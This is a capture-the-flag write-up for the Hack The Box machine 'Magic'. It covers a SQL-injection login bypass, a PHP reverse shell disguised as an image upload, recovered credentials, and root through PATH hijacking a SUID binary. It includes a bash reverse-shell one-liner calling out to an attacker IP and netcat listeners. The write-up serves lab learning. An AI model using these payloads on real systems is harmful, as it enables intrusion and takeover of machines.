# Hack The Box - Magic

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Magic-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Operating System](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Focus](https://img.shields.io/badge/Focus-Web%20Exploitation-red?style=for-the-badge)

> **Magic** is a Medium-difficulty Linux machine focused primarily on web application exploitation and Linux privilege escalation. The attack begins with a SQL Injection vulnerability in the login functionality, which allows access to an administrative upload page. A malicious PHP file disguised as an image is then uploaded to obtain Remote Code Execution and a reverse shell as `www-data`. Database credentials found in the web application are used to obtain access as `theseus`. Finally, a custom SUID binary called `/bin/sysinfo` is abused through PATH hijacking to execute a malicious binary with root privileges.

---

## Machine Information

| Property | Value |
|---|---|
| **Machine** | Magic |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty** | Medium |
| **Target IP** | `10.129.42.27` |
| **Attacker IP** | `10.10.14.65` |
| **Main Services** | SSH, HTTP |
| **Main Technologies** | Apache, PHP, MySQL |
| **Main Techniques** | SQL Injection, File Upload Bypass, Remote Code Execution, Credential Extraction, SUID Abuse, PATH Hijacking |

---

# Attack Path

```text
Nmap
    │
    ▼
Apache HTTP Server
    │
    ▼
Web Enumeration
    │
    ▼
Login Page
    │
    ▼
SQL Injection
    │
    ▼
Authentication Bypass
    │
    ▼
Administrative Upload Page
    │
    ▼
Malicious PHP Image Upload
    │
    ▼
Remote Code Execution
    │
    ▼
Reverse Shell
    │
    ▼
www-data
    │
    ▼
db.php5
    │
    ▼
MySQL Credentials
    │
    ▼
Database Enumeration
    │
    ▼
theseus Credentials
    │
    ▼
theseus
    │
    ▼
SUID Enumeration
    │
    ▼
/bin/sysinfo
    │
    ▼
strings /bin/sysinfo
    │
    ▼
lshw / fdisk / cat / free
    │
    ▼
PATH Hijacking
    │
    ▼
Malicious lshw Binary
    │
    ▼
sysinfo Executes Malicious Binary as root
    │
    ▼
Root
```

---

# 1. Reconnaissance

## Full TCP Port Scan

The first step was to perform a full TCP port scan to identify all services exposed by the target.

```bash
nmap -sV -sS -sC -p- --min-rate 5000 -Pn 10.129.42.27 -oN nmap
```

<img width="953" height="407" alt="image" src="https://github.com/user-attachments/assets/7d148daf-13c5-43a6-8fca-b528614688db" />


The scan revealed the following relevant services:

```text
22/tcp   SSH
80/tcp   HTTP
```

The HTTP service became the main attack surface.

---

# 2. Web Enumeration

Navigating to the web server:

```text
http://10.129.42.27
```

reveals the web application hosted by the target.

Directory and file enumeration was performed to identify additional application functionality.

For example:

```bash
gobuster dir -u http://10.129.42.27 -w /usr/share/wordlists/dirb/common.txt
```

The enumeration revealed interesting application paths, including the login functionality.


---

# 3. SQL Injection

The application contains a login page that is vulnerable to SQL Injection.

The authentication mechanism can be bypassed by manipulating the SQL query through the login parameters.

A basic authentication bypass payload can be used:

```text
admin'-- -
```

The exact placement of the payload depends on how the application constructs the SQL query.

After submitting the malicious input, authentication succeeds without knowing a valid password.

<img width="955" height="951" alt="image" src="https://github.com/user-attachments/assets/aa543c65-26b7-4a0d-bba1-43ae10b7dd9b" />


---

# 4. Administrative Upload Functionality

After successfully bypassing the login mechanism, an administrative interface becomes available.

The application provides an image upload functionality.

The upload mechanism performs validation on the uploaded file, including checks related to the file extension and image contents.

The goal is to upload a PHP file that can be executed by the web server.

---

# 5. Malicious Image Upload

A PHP reverse shell is prepared and disguised as an image.

The filename used was:

```text
webshell.php.jpg
```

The payload is a PHP reverse shell that connects back to the attacker machine.

Because the application expects an image, valid image magic bytes can be placed at the beginning of the file so that it passes the image validation.

The resulting file contains a valid image header followed by PHP code.


---

# 6. Uploading the Payload

Upload the malicious file through the administrative upload functionality.

The application accepts the file because it appears to be a valid image and uses an image extension.

The uploaded file is stored inside:

```text
/images/uploads/
```

The uploaded file can then be accessed through the browser.

Example:

```text
http://10.129.42.27/images/uploads/webshell.php.jpg
```

---

# 7. Remote Command Execution

The uploaded PHP file is interpreted by the web server, allowing PHP code to execute.

This provides Remote Code Execution under the privileges of the Apache web server.

Before triggering the reverse shell, start a listener on the attacker machine:

```bash
nc -lvnp 1234
```

Attacker IP:

```text
10.10.14.65
```

Trigger the uploaded PHP payload from the browser.

Once executed, the target connects back to the attacker machine.


<img width="956" height="143" alt="image" src="https://github.com/user-attachments/assets/bf8af378-4e47-47b1-bc36-98cd8edb4499" />



---

# 8. Initial Shell

The reverse shell is obtained as:

```text
www-data
```

Verify the current user:

```bash
whoami
```

Expected output:

```text
www-data
```

Check the current privileges:

```bash
id
```

The initial foothold is limited to the privileges of the web server account.

---

# 9. Web Application Enumeration

After obtaining the initial shell, enumerate the web application files.

The application is located under:

```text
/var/www/Magic
```

Navigate to the directory:

```bash
cd /var/www/Magic
```

List the application files:

```bash
ls -la
```

An interesting database configuration file is discovered:

```text
db.php5
```

Inspect the file:

```bash
cat db.php5
```

The file contains credentials used by the application to connect to the local MySQL database.

<img width="956" height="757" alt="image" src="https://github.com/user-attachments/assets/e79ec097-7ab5-4e09-82e7-6a0d8c35d47c" />


---

# 10. Database Enumeration

The database credentials can be used to interact with the local MySQL database.

The target does not necessarily have the MySQL client installed, so the database can be dumped using `mysqldump`.

The discovered credentials are:

```text
Username: theseus
Password: iamkingtheseus
Database: Magic
```

Dump the database:

```bash
mysqldump -u theseus -p magic
```

<img width="955" height="791" alt="image" src="https://github.com/user-attachments/assets/f812b088-4c12-422e-8a7b-19f2e2b0c757" />


Review the output for interesting information.

The database contains credentials that can be used to authenticate as the local user:

```text
theseus
```

---

# 11. Switching to Theseus

Use the discovered credentials to switch from `www-data` to the `theseus` user.

```bash
su - theseus
```

Enter the recovered password:

```text
Th3s3usW4sK1ng
```

Verify the current user:

```bash
whoami
```

Expected output:

```text
theseus
```

<img width="959" height="154" alt="image" src="https://github.com/user-attachments/assets/9090ccb3-1159-468d-90ca-b685bdb7be7b" />


---

# 12. User Flag

The user flag is located in the `theseus` home directory.

List the directory:

```bash
ls -la /home/theseus
```

Read the flag:

```bash
cat /home/theseus/user.txt
```

---

# 13. Privilege Escalation Enumeration

Now that access has been obtained as `theseus`, enumerate the system for possible privilege escalation vectors.

Check the user's groups:

```bash
id
```

The user belongs to the `users` group.

Search for files belonging to this group:

```bash
find / -group users -type f 2>/dev/null
```

An unusual binary is discovered:

```text
/bin/sysinfo
```

Check its permissions:

```bash
ls -l /bin/sysinfo
```

The binary has the SUID bit enabled and is owned by `root`.

Example:

```text
-rwsr-x--- 1 root users ... /bin/sysinfo
```

The SUID permission means that the binary executes with the privileges of its owner.

Since the owner is `root`, commands executed by this binary can potentially run with root privileges.

<img width="946" height="606" alt="image" src="https://github.com/user-attachments/assets/42d1d90a-0179-482a-b698-74d81857f4cf" />


---

# 14. Analyzing /bin/sysinfo

Execute the binary:

```bash
/bin/sysinfo
```

The program displays information about the system, including hardware, disk, CPU, and memory information.

To understand how the binary works internally, inspect its strings:

```bash
strings /bin/sysinfo
```

Interesting output includes:

```text
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
```

This reveals that the program executes several external binaries:

```text
lshw
fdisk
cat
free
```


---

# 15. Identifying the PATH Hijacking Vulnerability

The important detail is that the binaries are referenced using their names rather than absolute paths.

For example:

```text
free
```

instead of:

```text
/usr/bin/free
```

When a command is executed without an absolute path, Linux searches the directories specified in the `PATH` environment variable.

Check the current PATH:

```bash
echo $PATH
```

Because `/bin/sysinfo` runs with SUID privileges and executes commands using relative names, it is possible to place a malicious executable earlier in the PATH.

The malicious executable can then be executed by `/bin/sysinfo` with root privileges.

---

# 16. Creating the Malicious lshw Binary

Create a malicious executable named:

```text
free
```

The binary contains a reverse shell payload.

For example:

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.65/9001 0>&1' > free
```

Make it executable:

```bash
chmod +x free
```

Verify the contents:

```bash
cat free
```

Expected output:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.65/9001 0>&1
```

<img width="959" height="210" alt="image" src="https://github.com/user-attachments/assets/18d700d0-923f-4ad7-8356-321c52ca8e3c" />


---

# 17. Modifying the PATH

Move to the directory containing the malicious executable.

For example:

```bash
cd /tmp
```

or another writable directory where the malicious `free` file was created.

Prepend the current directory to the PATH:

```bash
export PATH=$(pwd):$PATH
```

Verify the modified PATH:

```bash
echo $PATH
```

The directory containing the malicious `free` executable must appear before the legitimate system directories.

Verify which `free` will be executed:

```bash
which free
```

The output should point to the malicious executable.

For example:

```text
/tmp/free
```

# 18. Starting the Root Listener

On the attacker machine, start a listener on the port used by the malicious payload:

```bash
nc -lvnp 9001
```

Attacker IP:

```text
10.10.14.65
```

---

# 19. Executing /bin/sysinfo

Run the SUID binary:

```bash
/bin/sysinfo
```

Because `/bin/sysinfo` executes `free` without specifying an absolute path, the system searches the directories contained in `PATH`.

The malicious `free` executable is found first.

Since `/bin/sysinfo` is executed with SUID privileges, the malicious executable is executed with root privileges.

The reverse shell connects back to the attacker machine.

<img width="952" height="147" alt="image" src="https://github.com/user-attachments/assets/fcc2e659-ef4e-4d9a-a016-15f098793cef" />

---

# 20. Root Access

Verify the current user:

```bash
whoami
```

Expected output:

```text
root
```

Verify the UID:

```bash
id
```

Expected output should contain:

```text
uid=0(root)
```

At this point, full root access has been obtained.

---

# 21. Root Flag

The root flag is located at:

```text
/root/root.txt
```

Read the flag:

```bash
cat /root/root.txt
```


---

# Flags

## User Flag

```text
/home/theseus/user.txt
```

```bash
cat /home/theseus/user.txt
```

## Root Flag

```text
/root/root.txt
```

```bash
cat /root/root.txt
```

---

# Key Takeaways

- Full port enumeration is essential even when only a few services are exposed.
- Web applications should be tested for authentication bypass vulnerabilities.
- SQL Injection can allow authentication mechanisms to be bypassed when user input is directly incorporated into SQL queries.
- File upload functionality should be tested for insufficient extension and content validation.
- Image upload restrictions can sometimes be bypassed using valid image magic bytes combined with a server-executable extension.
- Uploaded files should always be investigated to determine their exact storage location and whether they are executable.
- Configuration files such as `db.php5` can expose database credentials.
- Credentials recovered from application databases should be tested for local account reuse.
- SUID binaries owned by root should be carefully inspected during Linux privilege escalation enumeration.
- Custom binaries can introduce security vulnerabilities when they execute external programs without absolute paths.
- PATH hijacking can allow a malicious executable to be executed instead of the intended system binary.
- When the vulnerable parent process runs with SUID privileges, the hijacked executable may execute with elevated privileges.
- The `/bin/sysinfo` binary was vulnerable because it executed commands such as `free` using relative command names.
- A malicious `free` executable placed earlier in the PATH could therefore be executed with root privileges.

---

# Tools Used

- Nmap
- Gobuster
- Burp Suite
- Netcat
- MySQL / mysqldump
- Strings
- Find
- Linux shell

---

# Techniques Used

```text
Port Enumeration
Web Enumeration
SQL Injection
Authentication Bypass
File Upload Bypass
Magic Byte Manipulation
PHP Remote Code Execution
Reverse Shell
Web Application Enumeration
Credential Extraction
Credential Reuse
Linux Privilege Escalation
SUID Enumeration
Binary Analysis
PATH Hijacking
Root Shell
```

---

# References

- [Hack The Box - Magic](https://app.hackthebox.com/machines/Magic)
- [Exploit-DB](https://www.exploit-db.com/)

---

> This writeup was created for educational purposes and documents the exploitation of a retired Hack The Box machine in an authorized laboratory environment.
